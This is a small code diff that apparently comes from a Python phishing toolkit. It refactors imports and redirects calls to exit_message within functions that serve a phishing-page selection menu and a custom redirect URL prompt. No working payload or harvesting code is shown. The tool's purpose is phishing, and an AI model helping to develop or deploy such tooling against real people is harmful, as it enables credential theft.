@@ -1,6 +1,9 @@
 from Defs.ImportManager.unsorted_will_be_replaced import run_command, webpage_set, wait, path
-from Defs.ThemeManager.theme import default_palette
-from Defs.ActionManager.informant import exit_message, port_selector, module_loading_message
+import Defs.ThemeManager.theme as theme
+import Defs.ActionManager.simple_informant as simple_informant
+
+default_palette = theme.default_palette
+module_loading_message = simple_informant.module_loading_message
 
 
 def start_main_menu():
@@ -221,7 +224,7 @@ ________________________________________________________________________________
         start_phishing_page('LOCATION', customOption)
 
     else:
-        exit_message(port)
+        simple_informant.exit_message(port)
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
@@ -356,7 +359,7 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
         input('\nPress Enter To continue...')
 
     else:
-        exit_message(port)
+        simple_informant.exit_message(port)
 
 def enter_custom_redirecting_url():  # Question where user can input custom web-link
     run_command('clear')
